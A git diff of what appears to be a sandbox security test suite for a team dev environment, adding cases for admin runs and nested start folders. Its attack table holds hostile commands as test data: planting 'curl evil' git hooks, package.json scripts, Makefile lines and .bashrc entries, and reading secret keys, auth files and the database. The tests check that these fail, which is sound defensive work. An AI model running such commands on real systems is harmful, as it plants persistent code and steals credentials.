@@ -11,6 +11,7 @@ import net from 'node:net'
 import path from 'node:path'
 import { RuleSet, type Access } from '../../server/src/policy/access'
 import { folderView } from '../../server/src/devenv/srt/access'
+import { holdPlaceholders, SRT_DENY_DIRS, SRT_DENY_FILES } from '../../server/src/devenv/srt/placeholders'
 import { chatWork, devenvPaths, personHome, personLogs, resolveRunCwd, runEnv, srtSettings, settingsProblems, wrappedArgv } from '../../server/src/devenv/srt/config'
 
 const ID = 'mycel'
@@ -47,6 +48,9 @@ w('users/alice/todo.md', 'alice todo\n')
 w('shared/repo/package.json', '{"scripts":{"test":"echo ok"}}\n')
 fs.mkdirSync(`${TEAM}/shared/repo/.git/hooks`, { recursive: true }); fs.writeFileSync(`${TEAM}/shared/repo/.git/config`, '[core]\n')
 w('groups/marketing/Makefile', 'all:\n\techo ok\n')
+// a project folder inside her group folder (no rule of its own): in a run that starts there, the group folder above is
+// read-only and the project folder is writable inside it
+w('groups/marketing/campaign/plan.md', 'campaign plan\n')
 w('users/bob/notes.md', `${CANARY}-bob`)
 w('.system/history/old.bin', `${CANARY}-system`)
 fs.mkdirSync(`${DIR1}/.git/hooks`, { recursive: true }); fs.writeFileSync(`${DIR1}/.git/config`, '[core]\n')
@@ -58,10 +62,13 @@ const RULES = new RuleSet(([
   ['projects/two', 'group', 'finance', 'write'],
 ] as [string, 'everyone' | 'group' | 'user', string | null, Access][]).map(([p, t, s, a]) => ({ path: p, subject_type: t, subject_id: s, access: a })))
 const ALICE = { id: ME, name: 'Alice', role: 'member' as const, groups: ['marketing'] }
+/** an admin: the rules give her write in the whole team folder, so in a run the team root is read-only (Q0 (b)) */
+const CAROL = { id: 'carol', name: 'Carol', role: 'admin' as const, groups: [] as string[] }
 fs.mkdirSync('/etc/default', { recursive: true }); fs.writeFileSync(`/etc/default/${ID}`, `MYCEL_TOKEN=${CANARY}-etcdefault\n`)
 fs.mkdirSync('/tmp/server-private', { recursive: true }); fs.writeFileSync('/tmp/server-private/t', `${CANARY}-tmp`)
 fs.mkdirSync(`/run/${ID}`, { recursive: true }); fs.writeFileSync(`/run/${ID}/x`, `${CANARY}-run`)
-for (const u of [ME, 'bob']) { fs.mkdirSync(path.join(personHome(BASE, u), 'tmp'), { recursive: true }); fs.mkdirSync(personLogs(BASE, u), { recursive: true }) }
+w('users/carol/c.md', 'carol note\n')
+for (const u of [ME, 'bob', 'carol']) { fs.mkdirSync(path.join(personHome(BASE, u), 'tmp'), { recursive: true }); fs.mkdirSync(personLogs(BASE, u), { recursive: true }) }
 fs.writeFileSync(path.join(personHome(BASE, 'bob'), 'secret'), `${CANARY}-other-home`)
 fs.writeFileSync(path.join(personLogs(BASE, 'bob'), 'job.log'), `${CANARY}-other-log`)
 fs.mkdirSync(WORK, { recursive: true }); fs.mkdirSync(chatWork(BASE, 'chat-2'), { recursive: true })
@@ -78,30 +85,36 @@ sh(`chown ${SRV} ${unixSock}`)
 process.env.MYCEL_LEAK = `${CANARY}-env`
 
 // ---- one run, as the runner does it (no scope) ----
+const SRT_NAMES = new Set([...SRT_DENY_FILES, ...SRT_DENY_DIRS.flatMap((d) => d.split('/').map((_, i, a) => a.slice(0, i + 1).join('/')))])
 let n = 0
-async function run(command: string, o: { network?: 'open' | 'offline'; cwd?: string; extra?: string[]; during?: () => void; timeoutMs?: number; work?: boolean } = {}): Promise<{ code: number | null; out: string; refused?: string }> {
+async function run(command: string, o: { network?: 'open' | 'offline'; cwd?: string; extra?: string[]; during?: () => void; timeoutMs?: number; work?: boolean; start?: string; who?: typeof ALICE | typeof CAROL } = {}): Promise<{ code: number | null; out: string; refused?: string }> {
   const runId = `attack${String(++n).padStart(10, '0')}`
   const work = o.work ? WORK : null
   // the run's view: the person's folder rules, writable only in the starting folder and her own folder
-  const start = work ? null : 'projects/one'
-  const view = folderView(RULES, ALICE, { start })
-  const input = { base: BASE, id: ID, teamRoot: TEAM, userId: ME, view, start, work, network: o.network ?? 'open', extraDomains: o.extra ?? [], denyHosts: ['team.trina.test'], denyAddrs: ['203.0.113.7'] }
+  const start = work ? null : o.start ?? 'projects/one'
+  const who = o.who ?? ALICE
+  const view = folderView(RULES, who, { start })
+  const input = { base: BASE, id: ID, teamRoot: TEAM, userId: who.id, view, start, work, network: o.network ?? 'open', extraDomains: o.extra ?? [], denyHosts: ['team.trina.test'], denyAddrs: ['203.0.113.7'] }
   const settings = srtSettings(input)
   const problems = settingsProblems(settings, input)
   if (problems.length) throw new Error(problems.join('; '))
-  const root = work ?? DIR1
+  const root = work ?? `${TEAM}/${start}`
   const cwd = resolveRunCwd(root, o.cwd ?? '')
   if (!cwd) return { code: null, out: '', refused: 'cwd' }
   const settingsFile = path.join(devenvPaths(BASE).run, `${runId}.json`)
   fs.writeFileSync(settingsFile, JSON.stringify(settings), { mode: 0o600 }); sh(`chown ${SRV} ${settingsFile}`)
-  const exitFile = path.join(personLogs(BASE, ME), `${runId}.exit`)
+  const exitFile = path.join(personLogs(BASE, who.id), `${runId}.exit`)
   const argv = ['setpriv', `--reuid=${SRV}`, `--regid=${SRV}`, '--init-groups', '--', ...wrappedArgv({ exitFile, settingsFile, command })]
-  const p = Bun.spawn(argv, { cwd, env: runEnv({ base: BASE, userId: ME, teamRoot: TEAM, work }), stdin: 'ignore', stdout: 'pipe', stderr: 'pipe' })
+  // as the runner: srt's protected names exist in the cwd before the run (placeholders.ts), owned by the server account
+  const release = holdPlaceholders(cwd)
+  sh(`chown -h ${SRV}:${SRV} ${[...SRT_NAMES].map((n) => `'${path.join(cwd, n)}'`).join(' ')} 2>/dev/null || true`)
+  const p = Bun.spawn(argv, { cwd, env: runEnv({ base: BASE, userId: who.id, teamRoot: TEAM, work }), stdin: 'ignore', stdout: 'pipe', stderr: 'pipe' })
   const t = setTimeout(() => p.kill('SIGKILL'), o.timeoutMs ?? 60_000)
   if (o.during) setTimeout(o.during, 1500)
   const [a, b] = await Promise.all([new Response(p.stdout).text(), new Response(p.stderr).text()])
   await p.exited; clearTimeout(t)
   const code = fs.existsSync(exitFile) ? Number(fs.readFileSync(exitFile, 'utf8').trim()) : null
+  release()
   fs.rmSync(settingsFile, { force: true }); fs.rmSync(exitFile, { force: true })
   return { code, out: a + b }
 }
@@ -120,6 +133,12 @@ const attacks: { id: string; what: string; cmd: string; check: Check; o?: Parame
   { id: 'A28', what: 'a code channel to another person: a git hook, package.json and a Makefile in shared folders', cmd: `echo "curl evil" > ${TEAM}/shared/repo/.git/hooks/pre-commit || echo '{"scripts":{"test":"curl evil"}}' > ${TEAM}/shared/repo/package.json || echo "[core] hooksPath=/x" >> ${TEAM}/shared/repo/.git/config || printf 'all:\\n\\tcurl evil\\n' > ${TEAM}/groups/marketing/Makefile || echo x >> ${TEAM}/shared/s.md || echo x > ${TEAM}/groups/marketing/.envrc || mkdir ${TEAM}/shared/new`, check: failsQuietly,
     after: () => (fs.existsSync(`${TEAM}/shared/repo/.git/hooks/pre-commit`) || fs.readFileSync(`${TEAM}/shared/repo/package.json`, 'utf8').includes('evil') || fs.readFileSync(`${TEAM}/shared/repo/.git/config`, 'utf8').includes('hooksPath')
       || fs.readFileSync(`${TEAM}/groups/marketing/Makefile`, 'utf8').includes('evil') || fs.readFileSync(`${TEAM}/shared/s.md`, 'utf8') !== 'shared text\n' || fs.existsSync(`${TEAM}/groups/marketing/.envrc`) || fs.existsSync(`${TEAM}/shared/new`) ? 'a shared folder changed' : null) },
+  { id: 'A28c', what: 'a start folder inside a folder that is read-only in the run: the start folder is writable, the folder above is not', cmd: `cat plan.md && echo x > new.txt && cat new.txt && (echo y >> ${TEAM}/groups/marketing/brief.md && echo WROTE-ABOVE; true)`, check: both(ok, has('campaign plan'), (r) => (r.out.includes('WROTE-ABOVE') ? 'the group folder above was writable' : null)), o: { start: 'groups/marketing/campaign' },
+    after: () => (!fs.existsSync(`${TEAM}/groups/marketing/campaign/new.txt`) ? 'new.txt is not on the disk' : fs.readFileSync(`${TEAM}/groups/marketing/brief.md`, 'utf8') !== 'marketing brief\n' ? 'brief.md changed' : null) },
+  { id: 'A28d', what: 'an admin: the project folder and her own folder are writable; the team root and every other folder are read-only', cmd: `cat readme.md && echo a > admin.txt && cat admin.txt && echo c >> ${TEAM}/users/carol/c.md && cat ${TEAM}/groups/finance/budget.md | head -c 0 && (echo z > ${TEAM}/top.txt && echo WROTE-ROOT; echo z >> ${TEAM}/groups/finance/budget.md && echo WROTE-FINANCE; true)`, check: both(ok, has('hello from p1'), (r) => (/WROTE-(ROOT|FINANCE)/.test(r.out) ? 'a folder outside the project was writable' : null)), o: { who: CAROL },
+    after: () => (!fs.existsSync(`${DIR1}/admin.txt`) ? 'admin.txt is not on the disk' : fs.existsSync(`${TEAM}/top.txt`) ? 'the team root changed' : !fs.readFileSync(`${TEAM}/users/carol/c.md`, 'utf8').includes('c\n') ? 'her own folder was not writable' : null) },
+  { id: 'A28e', what: 'an admin\'s run (the start folder bound back writable): .git/hooks, .git/config and .bashrc there stay read-only', cmd: 'echo "curl evil" > .git/hooks/pre-commit || echo "[core] hooksPath=/x" >> .git/config || echo evil >> .bashrc', check: failsQuietly, o: { who: CAROL },
+    after: () => (fs.existsSync(`${DIR1}/.git/hooks/pre-commit`) || fs.readFileSync(`${DIR1}/.git/config`, 'utf8').includes('hooksPath') || (fs.existsSync(`${DIR1}/.bashrc`) && fs.readFileSync(`${DIR1}/.bashrc`, 'utf8').includes('evil')) ? 'a protected file changed' : null) },
   { id: 'A28b', what: 'a chat with no project: the project folder and the shared folders are read-only', cmd: `echo x > ${DIR1}/planted.js || echo x >> ${DIR1}/readme.md || echo "curl evil" > ${TEAM}/shared/repo/.git/hooks/post-checkout || echo x >> ${TEAM}/shared/s.md`, check: failsQuietly, o: { work: true },
     after: () => (fs.existsSync(`${DIR1}/planted.js`) || fs.readFileSync(`${DIR1}/readme.md`, 'utf8') !== 'hello from p1\n' || fs.existsSync(`${TEAM}/shared/repo/.git/hooks/post-checkout`) || fs.readFileSync(`${TEAM}/shared/s.md`, 'utf8') !== 'shared text\n' ? 'a team folder outside the work folder changed' : null) },
   { id: 'A1', what: 'the DB, secrets, config, engine logins', cmd: `cat ${BASE}/data/app.db || cat ${BASE}/secrets/master.key || cat ${BASE}/config/server.json || cat ${BASE}/agent/codex-auth/auth.json || grep -r ${CANARY} ${BASE}`, check: failsQuietly },
